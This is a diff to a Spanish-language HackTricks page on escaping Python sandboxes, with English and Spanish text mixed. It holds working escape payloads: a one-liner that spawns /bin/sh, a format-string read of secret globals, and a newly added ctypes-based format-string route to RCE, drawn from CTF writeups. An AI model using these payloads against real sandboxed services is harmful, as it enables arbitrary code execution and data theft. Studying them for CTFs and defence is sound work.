@@ -1,8 +1,8 @@
 # Bypass Python sandboxes
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -150,9 +150,9 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 [y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
 ## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
 ```
-## Bypass de protecciones a través de codificaciones (UTF-7)
+## Bypassing protections through encodings (UTF-7)
 
-En [**este informe**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) se utiliza UFT-7 para cargar y ejecutar código python arbitrario dentro de una aparente sandbox:
+En [**este informe**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) se utiliza UTF-7 para cargar y ejecutar código python arbitrario dentro de una aparente sandbox:
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -167,7 +167,7 @@ También es posible eludirlo utilizando otras codificaciones, por ejemplo, `raw_
 
 ## Ejecución de Python sin llamadas
 
-Si estás dentro de una cárcel de python que **no te permite hacer llamadas**, todavía hay algunas formas de **ejecutar funciones arbitrarias, código** y **comandos**.
+Si estás dentro de una cárcel de python que **no te permite hacer llamadas**, todavía hay algunas formas de **ejecutar funciones, código** y **comandos arbitrarios**.
 
 ### RCE con [decoradores](https://docs.python.org/3/glossary.html#term-decorator)
 ```python
@@ -676,14 +676,9 @@ Puedes verificar la salida de este script en esta página:
 [https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md](https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md)
 {% endcontent-ref %}
 
-## Formato de Cadena en Python
+## Formato de cadena de Python
 
 Si **envías** una **cadena** a python que va a ser **formateada**, puedes usar `{}` para acceder a **información interna de python.** Puedes usar los ejemplos anteriores para acceder a globals o builtins, por ejemplo.
-
-{% hint style="info" %}
-Sin embargo, hay una **limitación**, solo puedes usar los símbolos `.[]`, así que **no podrás ejecutar código arbitrario**, solo leer información.\
-_**Si sabes cómo ejecutar código a través de esta vulnerabilidad, por favor contáctame.**_
-{% endhint %}
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 CONFIG = {
@@ -743,14 +738,58 @@ Consulta también la siguiente página para gadgets que **leerán información s
 
 # Access an element through several links
 {whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
+
+# Example from https://corgi.rip/posts/buckeye-writeups/
+secret_variable = "clueless"
+x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
+str(x) # Out: clueless
 ```
-## Dissecting Python Objects
+### De formato a RCE cargando bibliotecas
+
+Según el [**desafío TypeMonkey de este informe**](https://corgi.rip/posts/buckeye-writeups/), es posible cargar bibliotecas arbitrarias desde el disco abusando de la vulnerabilidad de cadena de formato en python.
+
+Como recordatorio, cada vez que se realiza una acción en python, se ejecuta alguna función. Por ejemplo, `2*3` ejecutará **`(2).mul(3)`** o **`{'a':'b'}['a']`** será **`{'a':'b'}.__getitem__('a')`**.
+
+Tienes más como esto en la sección [**Ejecución de Python sin llamadas**](./#python-execution-without-calls).
+
+Una vulnerabilidad de cadena de formato en python no permite ejecutar funciones (no permite usar paréntesis), por lo que no es posible obtener RCE como `'{0.system("/bin/sh")}'.format(os)`.\
+Sin embargo, es posible usar `[]`. Por lo tanto, si una biblioteca común de python tiene un método **`__getitem__`** o **`__getattr__`** que ejecuta código arbitrario, es posible abusar de ellos para obtener RCE.
+
+Buscando un gadget así en python, el informe propone esta [**consulta de búsqueda en Github**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code). Donde encontró este [uno](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463):
+```python
+class LibraryLoader(object):
+def __init__(self, dlltype):
+self._dlltype = dlltype
+
+def __getattr__(self, name):
+if name[0] == '_':
+raise AttributeError(name)
+try:
+dll = self._dlltype(name)
+except OSError:
+raise AttributeError(name)
+setattr(self, name, dll)
+return dll
+
+def __getitem__(self, name):
+return getattr(self, name)
+
+cdll = LibraryLoader(CDLL)
+pydll = LibraryLoader(PyDLL)
+```
+Este gadget permite **cargar una biblioteca desde el disco**. Por lo tanto, es necesario de alguna manera **escribir o subir la biblioteca para cargarla** correctamente compilada en el servidor atacado.
+```python
+'{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
+```
+El desafío en realidad abusa de otra vulnerabilidad en el servidor que permite crear archivos arbitrarios en el disco de los servidores.
+
+## Disectando Objetos de Python
 
 {% hint style="info" %}
 Si quieres **aprender** sobre **bytecode de python** en profundidad, lee este **increíble** post sobre el tema: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
-En algunos CTFs, se te podría proporcionar el nombre de una **función personalizada donde reside la bandera** y necesitas ver los **internos** de la **función** para extraerla.
+En algunos CTFs se te podría proporcionar el nombre de una **función personalizada donde reside la bandera** y necesitas ver los **internos** de la **función** para extraerla.
 
 Esta es la función a inspeccionar:
 ```python
@@ -1011,7 +1050,7 @@ Usando herramientas como [**https://www.decompiler.com/**](https://www.decompile
 ### Assert
 
 Python ejecutado con optimizaciones con el parámetro `-O` eliminará las declaraciones de aserción y cualquier código condicional en el valor de **debug**.\
-Por lo tanto, verificaciones como
+Por lo tanto, las verificaciones como
 ```python
 def check_permission(super_user):
 try:
@@ -1031,18 +1070,17 @@ will be bypassed
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-
 {% hint style="success" %}
-Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Apoya a HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
